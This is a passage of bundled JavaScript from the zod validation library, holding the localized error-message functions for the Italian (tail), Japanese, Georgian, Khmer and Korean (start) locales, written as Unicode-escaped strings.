        return `Chiave non valida in ${issue2.origin}`;
      case "invalid_union":
        return "Input non valido";
      case "invalid_element":
        return `Valore non valido in ${issue2.origin}`;
      default:
        return `Input non valido`;
    }
  };
};
function it_default() {
  return {
    localeError: error21()
  };
}
// node_modules/zod/v4/locales/ja.js
var error22 = () => {
  const Sizable = {
    string: { unit: "\u6587\u5B57", verb: "\u3067\u3042\u308B" },
    file: { unit: "\u30D0\u30A4\u30C8", verb: "\u3067\u3042\u308B" },
    array: { unit: "\u8981\u7D20", verb: "\u3067\u3042\u308B" },
    set: { unit: "\u8981\u7D20", verb: "\u3067\u3042\u308B" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u5165\u529B\u5024",
    email: "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9",
    url: "URL",
    emoji: "\u7D75\u6587\u5B57",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO\u65E5\u6642",
    date: "ISO\u65E5\u4ED8",
    time: "ISO\u6642\u523B",
    duration: "ISO\u671F\u9593",
    ipv4: "IPv4\u30A2\u30C9\u30EC\u30B9",
    ipv6: "IPv6\u30A2\u30C9\u30EC\u30B9",
    cidrv4: "IPv4\u7BC4\u56F2",
    cidrv6: "IPv6\u7BC4\u56F2",
    base64: "base64\u30A8\u30F3\u30B3\u30FC\u30C9\u6587\u5B57\u5217",
    base64url: "base64url\u30A8\u30F3\u30B3\u30FC\u30C9\u6587\u5B57\u5217",
    json_string: "JSON\u6587\u5B57\u5217",
    e164: "E.164\u756A\u53F7",
    jwt: "JWT",
    template_literal: "\u5165\u529B\u5024"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u6570\u5024",
    array: "\u914D\u5217"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u7121\u52B9\u306A\u5165\u529B: instanceof ${issue2.expected}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F\u304C\u3001${received}\u304C\u5165\u529B\u3055\u308C\u307E\u3057\u305F`;
        }
        return `\u7121\u52B9\u306A\u5165\u529B: ${expected}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F\u304C\u3001${received}\u304C\u5165\u529B\u3055\u308C\u307E\u3057\u305F`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u7121\u52B9\u306A\u5165\u529B: ${stringifyPrimitive(issue2.values[0])}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F`;
        return `\u7121\u52B9\u306A\u9078\u629E: ${joinValues(issue2.values, "\u3001")}\u306E\u3044\u305A\u308C\u304B\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      case "too_big": {
        const adj = issue2.inclusive ? "\u4EE5\u4E0B\u3067\u3042\u308B" : "\u3088\u308A\u5C0F\u3055\u3044";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u5927\u304D\u3059\u304E\u308B\u5024: ${issue2.origin ?? "\u5024"}\u306F${issue2.maximum.toString()}${sizing.unit ?? "\u8981\u7D20"}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u5927\u304D\u3059\u304E\u308B\u5024: ${issue2.origin ?? "\u5024"}\u306F${issue2.maximum.toString()}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "\u4EE5\u4E0A\u3067\u3042\u308B" : "\u3088\u308A\u5927\u304D\u3044";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u5C0F\u3055\u3059\u304E\u308B\u5024: ${issue2.origin}\u306F${issue2.minimum.toString()}${sizing.unit}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u5C0F\u3055\u3059\u304E\u308B\u5024: ${issue2.origin}\u306F${issue2.minimum.toString()}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.prefix}"\u3067\u59CB\u307E\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "ends_with")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.suffix}"\u3067\u7D42\u308F\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "includes")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.includes}"\u3092\u542B\u3080\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "regex")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: \u30D1\u30BF\u30FC\u30F3${_issue.pattern}\u306B\u4E00\u81F4\u3059\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u7121\u52B9\u306A${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u7121\u52B9\u306A\u6570\u5024: ${issue2.divisor}\u306E\u500D\u6570\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      case "unrecognized_keys":
        return `\u8A8D\u8B58\u3055\u308C\u3066\u3044\u306A\u3044\u30AD\u30FC${issue2.keys.length > 1 ? "\u7FA4" : ""}: ${joinValues(issue2.keys, "\u3001")}`;
      case "invalid_key":
        return `${issue2.origin}\u5185\u306E\u7121\u52B9\u306A\u30AD\u30FC`;
      case "invalid_union":
        return "\u7121\u52B9\u306A\u5165\u529B";
      case "invalid_element":
        return `${issue2.origin}\u5185\u306E\u7121\u52B9\u306A\u5024`;
      default:
        return `\u7121\u52B9\u306A\u5165\u529B`;
    }
  };
};
function ja_default() {
  return {
    localeError: error22()
  };
}
// node_modules/zod/v4/locales/ka.js
var error23 = () => {
  const Sizable = {
    string: { unit: "\u10E1\u10D8\u10DB\u10D1\u10DD\u10DA\u10DD", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    file: { unit: "\u10D1\u10D0\u10D8\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    array: { unit: "\u10D4\u10DA\u10D4\u10DB\u10D4\u10DC\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    set: { unit: "\u10D4\u10DA\u10D4\u10DB\u10D4\u10DC\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0",
    email: "\u10D4\u10DA-\u10E4\u10DD\u10E1\u10E2\u10D8\u10E1 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    url: "URL",
    emoji: "\u10D4\u10DB\u10DD\u10EF\u10D8",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u10D7\u10D0\u10E0\u10D8\u10E6\u10D8-\u10D3\u10E0\u10DD",
    date: "\u10D7\u10D0\u10E0\u10D8\u10E6\u10D8",
    time: "\u10D3\u10E0\u10DD",
    duration: "\u10EE\u10D0\u10DC\u10D2\u10E0\u10EB\u10DA\u10D8\u10D5\u10DD\u10D1\u10D0",
    ipv4: "IPv4 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    ipv6: "IPv6 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    cidrv4: "IPv4 \u10D3\u10D8\u10D0\u10DE\u10D0\u10D6\u10DD\u10DC\u10D8",
    cidrv6: "IPv6 \u10D3\u10D8\u10D0\u10DE\u10D0\u10D6\u10DD\u10DC\u10D8",
    base64: "base64-\u10D9\u10DD\u10D3\u10D8\u10E0\u10D4\u10D1\u10E3\u10DA\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    base64url: "base64url-\u10D9\u10DD\u10D3\u10D8\u10E0\u10D4\u10D1\u10E3\u10DA\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    json_string: "JSON \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    e164: "E.164 \u10DC\u10DD\u10DB\u10D4\u10E0\u10D8",
    jwt: "JWT",
    template_literal: "\u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u10E0\u10D8\u10EA\u10EE\u10D5\u10D8",
    string: "\u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    boolean: "\u10D1\u10E3\u10DA\u10D4\u10D0\u10DC\u10D8",
    function: "\u10E4\u10E3\u10DC\u10E5\u10EA\u10D8\u10D0",
    array: "\u10DB\u10D0\u10E1\u10D8\u10D5\u10D8"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 instanceof ${issue2.expected}, \u10DB\u10D8\u10E6\u10D4\u10D1\u10E3\u10DA\u10D8 ${received}`;
        }
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${expected}, \u10DB\u10D8\u10E6\u10D4\u10D1\u10E3\u10DA\u10D8 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${stringifyPrimitive(issue2.values[0])}`;
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10D5\u10D0\u10E0\u10D8\u10D0\u10DC\u10E2\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8\u10D0 \u10D4\u10E0\u10D7-\u10D4\u10E0\u10D7\u10D8 ${joinValues(issue2.values, "|")}-\u10D3\u10D0\u10DC`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10D3\u10D8\u10D3\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue2.origin ?? "\u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0"} ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit}`;
        return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10D3\u10D8\u10D3\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue2.origin ?? "\u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0"} \u10D8\u10E7\u10DD\u10E1 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10DE\u10D0\u10E2\u10D0\u10E0\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10DE\u10D0\u10E2\u10D0\u10E0\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue2.origin} \u10D8\u10E7\u10DD\u10E1 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10D8\u10EC\u10E7\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 "${_issue.prefix}"-\u10D8\u10D7`;
        }
        if (_issue.format === "ends_with")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10DB\u10D7\u10D0\u10D5\u10E0\u10D3\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 "${_issue.suffix}"-\u10D8\u10D7`;
        if (_issue.format === "includes")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1 "${_issue.includes}"-\u10E1`;
        if (_issue.format === "regex")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D4\u10E1\u10D0\u10D1\u10D0\u10DB\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 \u10E8\u10D0\u10D1\u10DA\u10DD\u10DC\u10E1 ${_issue.pattern}`;
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E0\u10D8\u10EA\u10EE\u10D5\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10D8\u10E7\u10DD\u10E1 ${issue2.divisor}-\u10D8\u10E1 \u10EF\u10D4\u10E0\u10D0\u10D3\u10D8`;
      case "unrecognized_keys":
        return `\u10E3\u10EA\u10DC\u10DD\u10D1\u10D8 \u10D2\u10D0\u10E1\u10D0\u10E6\u10D4\u10D1${issue2.keys.length > 1 ? "\u10D4\u10D1\u10D8" : "\u10D8"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10D2\u10D0\u10E1\u10D0\u10E6\u10D4\u10D1\u10D8 ${issue2.origin}-\u10E8\u10D8`;
      case "invalid_union":
        return "\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0";
      case "invalid_element":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0 ${issue2.origin}-\u10E8\u10D8`;
      default:
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0`;
    }
  };
};
function ka_default() {
  return {
    localeError: error23()
  };
}
// node_modules/zod/v4/locales/km.js
var error24 = () => {
  const Sizable = {
    string: { unit: "\u178F\u17BD\u17A2\u1780\u17D2\u179F\u179A", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    file: { unit: "\u1794\u17C3", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    array: { unit: "\u1792\u17B6\u178F\u17BB", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    set: { unit: "\u1792\u17B6\u178F\u17BB", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B",
    email: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793\u17A2\u17CA\u17B8\u1798\u17C2\u179B",
    url: "URL",
    emoji: "\u179F\u1789\u17D2\u1789\u17B6\u17A2\u17B6\u179A\u1798\u17D2\u1798\u178E\u17CD",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u1780\u17B6\u179B\u1794\u179A\u17B7\u1785\u17D2\u1786\u17C1\u1791 \u1793\u17B7\u1784\u1798\u17C9\u17C4\u1784 ISO",
    date: "\u1780\u17B6\u179B\u1794\u179A\u17B7\u1785\u17D2\u1786\u17C1\u1791 ISO",
    time: "\u1798\u17C9\u17C4\u1784 ISO",
    duration: "\u179A\u1799\u17C8\u1796\u17C1\u179B ISO",
    ipv4: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv4",
    ipv6: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv6",
    cidrv4: "\u178A\u17C2\u1793\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv4",
    cidrv6: "\u178A\u17C2\u1793\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv6",
    base64: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u17A2\u17CA\u17B7\u1780\u17BC\u178A base64",
    base64url: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u17A2\u17CA\u17B7\u1780\u17BC\u178A base64url",
    json_string: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A JSON",
    e164: "\u179B\u17C1\u1781 E.164",
    jwt: "JWT",
    template_literal: "\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u179B\u17C1\u1781",
    array: "\u17A2\u17B6\u179A\u17C1 (Array)",
    null: "\u1782\u17D2\u1798\u17B6\u1793\u178F\u1798\u17D2\u179B\u17C3 (null)"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A instanceof ${issue2.expected} \u1794\u17C9\u17BB\u1793\u17D2\u178F\u17C2\u1791\u1791\u17BD\u179B\u1794\u17B6\u1793 ${received}`;
        }
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${expected} \u1794\u17C9\u17BB\u1793\u17D2\u178F\u17C2\u1791\u1791\u17BD\u179B\u1794\u17B6\u1793 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${stringifyPrimitive(issue2.values[0])}`;
        return `\u1787\u1798\u17D2\u179A\u17BE\u179F\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1787\u17B6\u1798\u17BD\u1799\u1780\u17D2\u1793\u17BB\u1784\u1785\u17C6\u178E\u17C4\u1798 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u1792\u17C6\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue2.origin ?? "\u178F\u1798\u17D2\u179B\u17C3"} ${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "\u1792\u17B6\u178F\u17BB"}`;
        return `\u1792\u17C6\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue2.origin ?? "\u178F\u1798\u17D2\u179B\u17C3"} ${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u178F\u17BC\u1785\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue2.origin} ${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u178F\u17BC\u1785\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue2.origin} ${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1785\u17B6\u1794\u17CB\u1795\u17D2\u178F\u17BE\u1798\u178A\u17C4\u1799 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1794\u1789\u17D2\u1785\u1794\u17CB\u178A\u17C4\u1799 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1798\u17B6\u1793 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u178F\u17C2\u1795\u17D2\u1782\u17BC\u1795\u17D2\u1782\u1784\u1793\u17B9\u1784\u1791\u1798\u17D2\u179A\u1784\u17CB\u178A\u17C2\u179B\u1794\u17B6\u1793\u1780\u17C6\u178E\u178F\u17CB ${_issue.pattern}`;
        return `\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u179B\u17C1\u1781\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u178F\u17C2\u1787\u17B6\u1796\u17A0\u17BB\u1782\u17BB\u178E\u1793\u17C3 ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u179A\u1780\u1783\u17BE\u1789\u179F\u17C4\u1798\u17B7\u1793\u179F\u17D2\u1782\u17B6\u179B\u17CB\u17D6 ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u179F\u17C4\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u1793\u17C5\u1780\u17D2\u1793\u17BB\u1784 ${issue2.origin}`;
      case "invalid_union":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C`;
      case "invalid_element":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u1793\u17C5\u1780\u17D2\u1793\u17BB\u1784 ${issue2.origin}`;
      default:
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C`;
    }
  };
};
function km_default() {
  return {
    localeError: error24()
  };
}

// node_modules/zod/v4/locales/kh.js
function kh_default() {
  return km_default();
}
// node_modules/zod/v4/locales/ko.js
var error25 = () => {
  const Sizable = {
    string: { unit: "\uBB38\uC790", verb: "to have" },
    file: { unit: "\uBC14\uC774\uD2B8", verb: "to have" },
    array: { unit: "\uAC1C", verb: "to have" },
    set: { unit: "\uAC1C", verb: "to have" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\uC785\uB825",
    email: "\uC774\uBA54\uC77C \uC8FC\uC18C",
    url: "URL",
    emoji: "\uC774\uBAA8\uC9C0",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \uB0A0\uC9DC\uC2DC\uAC04",
    date: "ISO \uB0A0\uC9DC",
    time: "ISO \uC2DC\uAC04",
    duration: "ISO \uAE30\uAC04",
    ipv4: "IPv4 \uC8FC\uC18C",
    ipv6: "IPv6 \uC8FC\uC18C",
    cidrv4: "IPv4 \uBC94\uC704",
    cidrv6: "IPv6 \uBC94\uC704",
    base64: "base64 \uC778\uCF54\uB529 \uBB38\uC790\uC5F4",
    base64url: "base64url \uC778\uCF54\uB529 \uBB38\uC790\uC5F4",
    json_string: "JSON \uBB38\uC790\uC5F4",
    e164: "E.164 \uBC88\uD638",
    jwt: "JWT",
    template_literal: "\uC785\uB825"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\uC798\uBABB\uB41C \uC785\uB825: \uC608\uC0C1 \uD0C0\uC785\uC740 instanceof ${issue2.expected}, \uBC1B\uC740 \uD0C0\uC785\uC740 ${received}\uC785\uB2C8\uB2E4`;
        }
        return `\uC798\uBABB\uB41C \uC785\uB825: \uC608\uC0C1 \uD0C0\uC785\uC740 ${expected}, \uBC1B\uC740 \uD0C0\uC785\uC740 ${received}\uC785\uB2C8\uB2E4`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\uC798\uBABB\uB41C \uC785\uB825: \uAC12\uC740 ${stringifyPrimitive(issue2.values[0])} \uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4`;
        return `\uC798\uBABB\uB41C \uC635\uC158: ${joinValues(issue2.values, "\uB610\uB294 ")} \uC911 \uD558\uB098\uC5EC\uC57C \uD569\uB2C8\uB2E4`;
      case "too_big": {
        const adj = issue2.inclusive ? "\uC774\uD558" : "\uBBF8\uB9CC";
